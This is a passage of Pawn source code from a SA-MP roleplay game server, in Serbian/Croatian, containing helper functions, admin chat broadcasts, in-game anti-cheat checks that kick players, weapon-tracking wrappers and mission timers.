    PlayerTextDrawSetProportional(playerid, TeksticTD[playerid], 1);

    ////////////////////////////////////////////////////////////////////////////
}
//------------------------------------------------------------------------------
stock OnePlayAnim( playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	ApplyAnimation( playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}
//------------------------------------------------------------------------------
stock UliceFirme( h ) {
	new imeulice[ MAX_ZONE_NAME ];
   	UliceFirme2( h, imeulice, sizeof( imeulice ) );
   	return imeulice;
}
//------------------------------------------------------------------------------
stock UliceFirme2(h, zone[], len) {
	new Float:x22, Float:y22;
	x22 = BussinesInfo[ h ][ bEnterX ]; y22 = BussinesInfo[ h ][ bEnterY ];
	for( new i = 0; i != sizeof(gSAZones); i++ ) {
		if(x22 >= gSAZones[ i ][SAZONE_AREA][0] && x22 <= gSAZones[ i ][SAZONE_AREA][ 3 ] && y22 >= gSAZones[ i ][SAZONE_AREA][1] && y22 <= gSAZones[ i ][SAZONE_AREA][4]) {
		    return format(zone, len, gSAZones[ i ][SAZONE_NAME], 0); } }
	return 0;
}
//------------------------------------------------------------------------------
stock RPImeIgraca( id ) {
	new ime[ MAX_PLAYER_NAME ];
 	GetPlayerName( id, ime, sizeof ime);
	return ime;
}
//------------------------------------------------------------------------------
stock ImeIgraca( id ) {
	new ime[ MAX_PLAYER_NAME ];
	if( Maskuse[ id ] == true ) format( ime, sizeof( ime ), "%s", RealName[ id ] );
 	else GetPlayerName( id, ime, sizeof ime);
	return ime;
}
//------------------------------------------------------------------------------
GetNearestContainer( playerid ) {
    for( new b = 1; b < MAX_KONT; b++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 4.0, KontInfo[b][koObjPos][0], KontInfo[b][koObjPos][1], KontInfo[b][koObjPos][2 ] ) ) return b; }
    return -1;
}
//------------------------------------------------------------------------------
GetNearestAtm( playerid ) {
    for( new b = 1; b < sizeof(atmInfo); b++) {
        if( IsPlayerInRangeOfPoint( playerid, 4.0, atmInfo[b][atmPos][0], atmInfo[b][atmPos][1], atmInfo[b][atmPos][2 ] ) ) return b; }
    return -1;
}
//------------------------------------------------------------------------------
GetNearestBussines( playerid ) {
    for( new b = 1; b < sizeof(BussinesInfo); b++) {
        if( IsPlayerInRangeOfPoint( playerid, 3.0, BussinesInfo[b][bEnterX], BussinesInfo[b][bEnterY], BussinesInfo[b][bEnterZ ] ) ) return b; }
    return -1;
}
//------------------------------------------------------------------------------
stock NextHotelID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), HOTEL_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock NextGateID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), GATE_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock SledeciIDFirme(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock SledeciIDImovine(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), IM_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock SledeciIDSalona(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), AS_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
SoundForAll( sound )
{
    foreach( Player, i )
    {
        if( IsPlayerConnected( i ) ) PlayerPlaySound( i, sound, 0.0, 0.0, 0.0 );
    }
}
//------------------------------------------------------------------------------
stock AdminPoruka( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) || PlayerInfo[i][xSpecAdmin] == 1) {
				SCM( i, color, string ); } } }
    return true;
}

stock AdminSMS( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) ) {
		        if(GetPVarInt( i, "ToggedPM") == 0) {
					SCM( i, color, string ); } } } }
    return true;
}
stock AdminWisper( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) ) {
		        if(GetPVarInt( i, "ToggedWISP") == 0) {
					SCM( i, color, string ); } } } }
    return true;
}
stock AdminRPoruka( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) ) {
		        if(GetPVarInt( i, "ToggedReport") == 0) {
					SCM( i, color, string ); } } } }
    return true;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
stock RPTPoruka( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 6 || IsPlayerAdmin( i ) || PlayerInfo[ i ][ xSupporter ] >= 1 ) {
		        if(GetPVarInt( i, "ToggedPomoc") == 0) {
					SCM( i, color, string ); } } } }
    return true;
}
stock RPTChatVlasnik( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
        if( IsPlayerConnected( i ) ) {
            if( PlayerInfo[ i ][ xAdmin ] >= 5 || IsPlayerAdmin( i )) {
                SCM( i, color, string ); } } }
    return true;
}
stock RPTChat( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) || PlayerInfo[ i ][ xSupporter ] >= 1 ) {
				SCM( i, color, string ); } } }
    return true;
}
stock RPTChatPlus( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) || PlayerInfo[ i ][ xSupporter ] >= 2 ) {
				SCM( i, color, string ); } } }
    return true;
}
stock PROMChat( color, string[] ) {
    for( new i = 0; i < MAX_PLAYERS; i++) {
		if( IsPlayerConnected( i ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) || PlayerInfo[ i ][ xPromoter ] >= 1 || PlayerInfo[ i ][ xSupporter ] >= 1 || PlayerInfo[ i ][ xVIPLevel ] >= 1 ) {
                if(GetPVarInt( i, "ToggedG") == 0) {
					SCM( i, color, string ); } } } }
    return true;
}

stock PromoteriAdminChat( color, string[] ) {

    for( new i = 0; i < MAX_PLAYERS; i++) {
    
		if( IsPlayerConnected( i ) ) {
		
		    if( PlayerInfo[ i ][ xAdmin ] >= 1 || IsPlayerAdmin( i ) || PlayerInfo[ i ][ xPromoter ] >= 1 ) {
		    
					SCM( i, color, string );
			}
		}
	}
    return true;
}

//------------------------------------------------------------------------------
stock antiSpeedVehicle( carid ) {
    new v = GetVehicleModel( carid );
    if( v == 593 || v == 592 || v == 577 || v == 553 || v == 520 || v == 519 || v == 511 || v == 460 || v == 563 || v == 548 || v == 497 || v == 488 || v == 487 || v == 469 || v == 447 || v == 417 ) {
		return 1;
	}
	return 0;
}
//------------------------------------------------------------------------------
forward OnPlayerFalla( playerid );
public OnPlayerFalla( playerid ) {
	if( antiCheatCS[ playerid ][ SpeedFall ] ) return 1;

	SetTimerEx( "Reactivate", 8000, false, "i", playerid );
	antiCheatCS[ playerid ][ SpeedFall ] = true;

	return 1;
}

forward FallingChecker( playerid );
public FallingChecker( playerid ) {
	new Float:Pos[ 4 ];

	if( IsPlayerConnected( playerid ) )	{
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		Pos[ 3 ] = floatsqroot( ( Pos[ 0 ]-antiCheatCS[ playerid ][ SpeedPos ][ 0 ] * Pos[ 0 ]-antiCheatCS[ playerid ][ SpeedPos ][ 0 ] ) + ( Pos[ 1 ]-antiCheatCS[ playerid ][ SpeedPos ][ 1 ] * Pos[ 1 ]-antiCheatCS[ playerid ][ SpeedPos ][ 1 ] ) );

		if( Pos[ 3 ] < 10 && ( antiCheatCS[ playerid ][ SpeedPos ][ 2 ] - Pos[ 2 ] ) > 5 ) {

			OnPlayerFalla( playerid );
		}
		antiCheatCS[ playerid ][ SpeedPos ][ 0 ] = Pos[ 0 ];
		antiCheatCS[ playerid ][ SpeedPos ][ 1 ] = Pos[ 1 ];
		antiCheatCS[ playerid ][ SpeedPos ][ 2 ] = Pos[ 2 ];
	}
	return 1;
}

forward Reactivate( playerid );
public Reactivate( playerid ) {

	antiCheatCS[ playerid ][ SpeedFall ] = false;

	return 1;
}
//------------------------------------------------------------------------------
stock AntiCheat( playerid ) {
	if( PlayerLogged[ playerid ] == true ) {
		// -- Anti Health
		// if( antiCheatSS[ antiHealthH  ] == true ) {
		// 	new Float:Zivot;
		// 	GetPlayerHealth( playerid, Zivot );
		//     if( KodSprunk( playerid ) ) {
		// 		Novi_SetPlayerHealth( playerid, Zivot );
		// 		return 1;
		// 	}
		// 	if( Zivot > antiCheatCS[ playerid ][ TrueHealth ] && !KodSprunk( playerid ) ) {
		// 		Novi_SetPlayerHealth( playerid, antiCheatCS[ playerid ][ TrueHealth ] );
		// 		return 1;
		// 	}
		// 	antiCheatCS[ playerid ][ TrueHealth ] = Zivot;
		// }
		
		// -- Anti Vehicle Repair
		if( antiCheatSS[ antiVehRepair ] == true ) {
		    if( antiCheatCS[ playerid ][ VehRepairTime ] <= 0 ) {
				if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
	               	new vehicleid = GetPlayerVehicleID( playerid ), Float:vHealth;
	               	GetVehicleHealth( vehicleid, vHealth );
	                if( vHealth > ( antiCheatVS[ vehicleid ][ VehTrueHealth ]+10 ) ) {
	            		if( antiCheatVS[ vehicleid ][ VehCheck ] == 1 && !AdminDuty[ playerid ] && !IsVehicleLetelica( GetPlayerVehicleID( playerid ) ) ) {
							if( !IsPlayerAtVehicleRepairPoint( playerid ) ) {
	                           	OnPlayerCheat( playerid, DETECT_VEHREPAIR_HACK, 0, 0 );
	                           	Novi_SetVehicleHealth( vehicleid, antiCheatVS[ vehicleid ][ VehTrueHealth ] );
	                           	antiCheatCS[ playerid ][ VehRepairTime ] = 3;
							}
	   					}
	        		}
	               	antiCheatVS[ vehicleid ][ VehTrueHealth ] = vHealth;
				}
			}
			else {
				antiCheatCS[ playerid ][ VehRepairTime ]--;
			}
		}
		// -- Anti Ping
		if( GetPlayerPing( playerid ) > 700 ) {
			antiCheatCS[ playerid ][ HighPing ]++;
			if( antiCheatCS[ playerid ][ HighPing ] == 4 ) {
				antiCheatCS[ playerid ][ HighPing ] = 0;
				Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Previsok Ping" );
			}
		}
		// -- Anti Armour
		if( antiCheatSS[ antiArmourH ] == true ) {
			new Float:Armour;
		    GetPlayerArmour( playerid, Armour );
		    if( Armour > antiCheatCS[ playerid ][ TrueArmour ] ) {
				Novi_SetPlayerArmour( playerid, antiCheatCS[ playerid ][ TrueArmour ] );
				return 1;
			}
			antiCheatCS[ playerid ][ TrueArmour ] = Armour;
		}
		//-- Anti Speed
		if( antiCheatSS[ antiSpeedH ] == true ) {
			if( IsPlayerInAnyVehicle( playerid ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
				if( GetPlayerSurfingVehicleID( playerid ) == INVALID_VEHICLE_ID && !IsVehicleLetelica( GetPlayerVehicleID( playerid ) ) && !antiSpeedVehicle( GetPlayerVehicleID( playerid ) ) ) {
                	new modelID = GetVehicleModel( GetPlayerVehicleID( playerid ) );
					if( !antiCheatCS[ playerid ][ SpeedFall ] && VehicleSpeedAC[ modelID-400 ][ 1 ] != 0 && GetSpeed( playerid ) > ( VehicleSpeedAC[ modelID-400 ][ 1 ]+20 ) ) {
                    	OnPlayerCheat( playerid, DETECT_SPEED_HACK, 0, 0 );
					}
				}
			}
			FallingChecker( playerid );
		}
		// -- Anti JetPack
		if( antiCheatSS[ antiJetPackH ] == true ) {
		    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) {
				if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK )
				    OnPlayerCheat( playerid, DETECT_JETPACK_HACK, 0, 0 );
			}
		}
		// -- Anti Money
		if( antiCheatSS[ antiMoneyH ] == true ) {
		    new PraviNovac = PlayerInfo[ playerid ][ xNovac ],
				StvoreniNovac = GetPlayerMoney( playerid );

		    if( StvoreniNovac > PraviNovac ) {
				ResetujBarNovac( playerid );
				UpdejtujBarNovac( playerid, PraviNovac );
			}
			else if( StvoreniNovac < PraviNovac ) {
				if( antiCheatCS[ playerid ][ InTuningGarage ] )
					PlayerInfo[ playerid ][ xNovac ] = StvoreniNovac;
				else if( ( ( PraviNovac - StvoreniNovac ) == 1 ) && ( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) )
				    PlayerInfo[ playerid ][ xNovac ] -= 1;
			}
		}
		antiCheatCS[ playerid ][ RemoveVehicle ] = false;
		//
		if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {

		    new Float:PlayerVel[ 3 ];
		    GetPlayerVelocity( playerid, PlayerVel[ 0 ], PlayerVel[ 1 ], PlayerVel[ 2 ] );

			if( floatround( PlayerVel[ 0 ] ) > 1 || floatround( PlayerVel[ 1 ] ) > 1 || floatround( PlayerVel[ 2 ] ) > 1 ) {
				if(IgracLeti{playerid}) return 0;
	            format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Speed ON foot Hack", ImeIgraca( playerid ) );
				AdminPoruka( SVETLOCRVENA, globalstring );
				Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Speed ON foot Hack");
	            return 0;
			}
		}
	}
    return 1;
}
//------------------------------------------------------------------------------
public OnPlayerClickMap( playerid, Float:fX, Float:fY, Float:fZ ) {
    if( playerid == INVALID_PLAYER_ID ) return 1;

    if(requestStrike[playerid] && !strikeReady[playerid]) {

        if(!IsPlayerInRangeOfPoint(playerid, 100.0, fX, fY, fZ)) return SendErrorMessage(playerid, "Lokacija je previse daleko! Oznaci drugu!");

        SendInfoMessage(playerid, "Vojnik : Lokacija primljena! Saljem letelicu!");

        stop strikeMapTimer;

        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, 1);
        RemovePlayerAttachedObject(playerid, OBJECT_SLOT_RHAND);

        strikeReady[playerid] = true;

        highLightID[playerid] = CreateMapHighlight(fX, fY, 0xFF0000FF, 30.0, 5.0, 500, 1, 10, 0, -1);
        //CreateMapHighlight(Float:x, Float:y, color, Float:distance, Float:width, interval, direction, max_steps, pause_time, playerid)

        foreach(Player, i) {

            if(IsPlayerInRangeOfPoint(i, 100.0, fX, fY, fZ)) {
                StopAudioStreamForPlayer(i);
                PlayAudioStreamForPlayer(i, "https://audio.jukehost.co.uk/6scVjBNXKD7RtBIaV3uDorwCc3oXJrAb");
            }
        }

        defer callStrike(playerid, fX, fY, fZ);

        //RemovePlayerMapIcon(playerid, 41);

        return 1;
    }

    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 && AdminDuty[ playerid ] ) {
        antiCheatCS[ playerid ][ TeleportCheck ] = 4;
        new Float:corZ;
        MapAndreas_FindZ_For2DCoord(fX, fY, corZ);
        new tmpcar = GetPlayerVehicleID( playerid );
        if( GetPlayerState( playerid ) == 2 ) {
            Novi_SetVehiclePos( tmpcar, fX, fY, corZ+1);
        }
        else {
            Novi_SetPlayerPos(playerid, fX, fY, corZ+1);
        }
	}

    return 1;
}
//------------------------------------------------------------------------------
stock Novi_IsNotWeaponNoAmmo( weaponid ) {
	new slot = g_aWeaponSlots[ weaponid ];
	if( slot != 0 && slot != 1 && slot != 10) return 1;
	return 0;
}

stock Novi_IsGiveVehicleWeapon( weaponid ) {
	if( weaponid == 46 || weaponid == 2 ) return 1;
	return 0;
}

GiveWeaponToPlayer( playerid, weaponid, ammo ) {

 	if( antiCheatCS[ playerid ][ WeaponCheck ] == 1 ) antiCheatCS[ playerid ][ WeaponCheck ] = 2;
	if( IsValidWeapon( weaponid ) ) {

	    antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;
	    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
   		antiCheatCS[ playerid ][ Weapon ][ g_aWeaponSlots[ weaponid ] ] = weaponid;
		antiCheatCS[ playerid ][ Ammo ][ g_aWeaponSlots[ weaponid ] ] += ammo;
  		GivePlayerWeapon( playerid, weaponid, ammo );
	}
    if( antiCheatCS[ playerid ][ WeaponCheck ] == 2 ) antiCheatCS[ playerid ][ WeaponCheck ] = 1;

	return 1;
}

SetWeaponAmmo( playerid, weapon, ammo ) {

	if(antiCheatCS[ playerid ][ WeaponCheck ] == 1 ) antiCheatCS[ playerid ][ WeaponCheck ] = 2;
	new slot = g_aWeaponSlots[ weapon ];
  	if( weapon > 0 && 47 > weapon && slot != -1 ) {
  	    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
  	    antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;
    	antiCheatCS[ playerid ][ Ammo ][ slot ] = ammo;
		SetPlayerAmmo( playerid, weapon, ammo );
	}
	if( antiCheatCS[ playerid ][ WeaponCheck ] == 2 ) antiCheatCS[ playerid ][ WeaponCheck ] = 1;

	return 1;
}


ResetAllWeapons( playerid ) {

	if( antiCheatCS[ playerid ][ WeaponCheck ] == 1 ) antiCheatCS[ playerid ][ WeaponCheck ] = 2;
	for( new i = 0; i < MAX_W_SLOTS; i++ ) {
	    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	    antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;
		antiCheatCS[ playerid ][ Weapon ][ i ] = 0;
		antiCheatCS[ playerid ][ Ammo ][ i ] = 0;
	}
	ResetPlayerWeapons(playerid);
	if( antiCheatCS[ playerid ][ WeaponCheck ]==2) antiCheatCS[ playerid ][ WeaponCheck ] = 1;

	return 1;
}

RemovePlayerWeapon( playerid, weaponid ) {

    if( antiCheatCS[ playerid ][ WeaponCheck ] == 1 ) antiCheatCS[ playerid ][ WeaponCheck ] = 2;
    antiCheatCS[ playerid ][ WeaponDetect ] = 3;
    antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;

	ResetPlayerWeapons( playerid );

	for( new i = 0; i < 13; i ++ ) {
	    if( antiCheatCS[ playerid ][ Weapon ][ i ] != weaponid ) {
	        GivePlayerWeapon( playerid, antiCheatCS[ playerid ][ Weapon ][ i ], antiCheatCS[ playerid ][ Ammo ][ i ] );
		}
		else {
            antiCheatCS[ playerid ][ Weapon ][ i ] = 0;
            antiCheatCS[ playerid ][ Ammo ][ i ] = 0;
	    }
	}
	if( antiCheatCS[ playerid ][ WeaponCheck ] == 2 ) antiCheatCS[ playerid ][ WeaponCheck ] = 1;
	return true;
}

stock GetWeapon( playerid ) {

	new weaponid = GetPlayerWeapon( playerid );

    new slot = g_aWeaponSlots[ weaponid ];
	if( IsValidWeapon( weaponid ) && slot != -1 && antiCheatCS[ playerid ][ Weapon ][ slot ] == weaponid )
        return weaponid;

	return 0;
}

stock HavePlayerWeapon( playerid ) {
	switch( GetPlayerWeapon( playerid ) ) {
		case 16..18, 22..39, 41, 42: return true;
	}
	return false;
}

stock GetPlayerWeaponAmmo( playerid, weaponid ) {
	new wd[ 2 ][ 13 ];
	for( new i; i < 13; i++ ) GetPlayerWeaponData( playerid, i, wd[ 0 ][ i ], wd[ 1 ][ i ] );
	for( new i; i < 13; i++ ) {
		if( weaponid == wd[ 0 ][ i ] ) return wd[ 1 ][ i ];
	}
	return 0;
}

timer resetCameraToranj[2500](playerid, num) {

    switch(num) {

        case 1: {

            ApplyActorAnimation(vojnik2EnemyT1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            Ubio1[playerid] = true;
        }
        case 2: {

            ApplyActorAnimation(vojnik2EnemyT2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2EnemyT2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            Ubio2[playerid] = true;
        }
    }
    defer vojnikWait(playerid);
    return 1;
}

timer vojnikWait[1500](playerid) {

    SetCameraBehindPlayer(playerid);

    TogglePlayerControllable(playerid, 1);

    vojnik2CP[playerid]++;

    if(vojnik2CP[playerid] == 14) {

        VojnikMessage(playerid, "Sabotiraj toranj!");

        Novi_SetPlayerCheckpoint(playerid, -650.5004,2319.9744,136.2455, 2.0);

        return 1;
    }
    else {

        VojnikMessage(playerid, "Imas jos jednog vojnika!");

        return 1;
    }
}

timer vojnikWait2[2500](playerid, num) {

    SetCameraBehindPlayer(playerid);

    TogglePlayerControllable(playerid, 1);

    vojnik2CP[playerid]++;

    if(num == 4) { 
        SendInfoMessage(playerid, "Pokupi dokumenta koja su ispala tipkom 'N'!");
        vojnik2Obj[playerid] = CreatePlayerObject(playerid, 2059, -407.97333, 2211.10913, 41.53681,   0.00000, 0.00000, 0.00000);

        return 1;
    }
    else return SendInfoMessage(playerid, "Nastavi dalje!");
}

timer resetCamera[1500](playerid, num) {

    switch(num) {

        case 1: {

            ApplyActorAnimation(vojnik2Enemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy1, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        }
        case 2: {

            ApplyActorAnimation(vojnik2Enemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy2, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        }
        case 3: {

            ApplyActorAnimation(vojnik2Enemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Enemy3, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        }
        case 4: {

            ApplyActorAnimation(vojnik2Boss, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Boss, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Boss, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
            ApplyActorAnimation(vojnik2Boss, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        }
    }
    defer vojnikWait2(playerid, num);

    return 1;
}

public OnPlayerWeaponShot( playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ ) {

    // if(weaponid == 34) { //Pracenje metka kada se puca iz snajpera

    //     new Float:Pos[3];
    //     GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

    //     TogglePlayerControllable(playerid, 0);

    //     InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], fX, fY, fZ, 3000, CAMERA_CUT);

    //     defer resetCamera(playerid);

    // }

    // if(hittype == BULLET_HIT_TYPE_VEHICLE){
    //     //if(!IsVehicleOccupied(hitid)){
    //     new panels, doors, lights, tires, Float:health;
    //     GetVehicleDamageStatus(hitid, panels, doors, lights, tires);
    //     switch(random(3)){
    //         case 0: panels = encode_panels(1, 1, 1, 1, 3, 3, 3);
    //         case 1: doors = encode_doors(4, 4, 4, 4);
    //         case 2: lights = encode_lights(1, 1, 1, 1);
    //     }
    //     GetVehicleHealth(hitid, health);
    //     SetVehicleHealth(hitid, (health -(weaponid * 2)));
    //     UpdateVehicleDamageStatus(hitid, panels, doors, lights, tires);
    //     //}
    // }

    if(!SkoroPucao[playerid]) {

        if(NaDmEventu[playerid]) return 1;
        if(WARPInfo[ playerid ][ warID ] != -1) return 1;

        new Float:PosX, Float:PosY, Float:PosZ;
        GetPlayerPos(playerid, PosX, PosY, PosZ);
        foreach(Player, i) {

            if(i == playerid) continue;
            if(IsPlayerInRangeOfPoint(i, 100.0, PosX, PosY, PosZ)) {

                SendInfoMessage(i, "U blizini se cuje pucnjava!");
                SkoroPucao[i] = true;
                SetPlayerMapIcon(i, 80, PosX, PosY, PosZ, 56, 0xFF0000AA, MAPICON_LOCAL);
                defer PucaoSkoro(i);
                defer SkiniMapIcon(i);
            }
        }
        SkoroPucao[playerid] = true;
        defer PucaoSkoro(playerid);
    }

    if(hittype == BULLET_HIT_TYPE_OBJECT) //Ako je upucao objekat
    {
        if(hitid == KontrolnaTabla)
        {
            if(UpucaoObjekat{playerid}) return 0;
            if(!RadiVojnik{playerid}) return 0; //Dodaj ovu liniju
            Novi_SetPlayerCheckpoint(playerid, 246.4245,1861.1426,14.0840, 2.0);
            VojnikMessage(playerid, "Nastavi dalje!");
            UpucaoObjekat{playerid} = true;
            VojnikMisijaJedanCP{playerid}++;
            return 1;
        }
    }

	if(hittype == BULLET_HIT_TYPE_PLAYER)
	{
		if(RadiVojnik{playerid} || RadiSabotazer{playerid} || MichaelMisija1CP2[playerid] || MichaelMisija1CP3[playerid] || radiMisiju[playerid] >= 2 || radiLovac[playerid]) return 0;
	}

    if( hittype != BULLET_HIT_TYPE_NONE ) {
        if( !( -1000.0 <= fX <= 1000.0 ) || !( -1000.0 <= fY <= 1000.0 ) || !( -1000.0 <= fZ <= 1000.0 ) ) {
		    format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Bullet Crash", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Bullet Crash");
            return 0;
		}
    }
    if( hittype == BULLET_HIT_TYPE_PLAYER ) {
        if( hitid == playerid ) {
            format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Bullet Crash", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Bullet Crash");
        	return 0;
		}
    }
    
    if( hittype == BULLET_HIT_TYPE_PLAYER ) {
        if( fX == 0.000000 && fY == 0.000000 && fZ == 0.500000 && weaponid == 0 ) {
            format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Command kill", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Command kill");
        	return 0;
        }
    }

    
    if( hittype == 0 && !IsValidWeapon( weaponid ) ) {
        if( fX == 0.000000 && fY == 0.000000 && fZ == 0.000000 ) {
            format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Bullet Crash", ImeIgraca( playerid ) );
			AdminPoruka( SVETLOCRVENA, globalstring );
			Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Bullet Crash");
        	return 0;
        }
    }
    
    if( antiCheatCS[ playerid ][ LastAmmo ] != 0 && weaponid != 38 ) {
        if( HavePlayerWeapon( playerid ) ) {
			if( antiCheatCS[ playerid ][ LastAmmo ] == GetPlayerWeaponAmmo( playerid, weaponid ) ) {
			    antiCheatCS[ playerid ][ LastAmmoChecks ]++;
			    if( antiCheatCS[ playerid ][ LastAmmoChecks ] >= 10 ) {
			        antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;
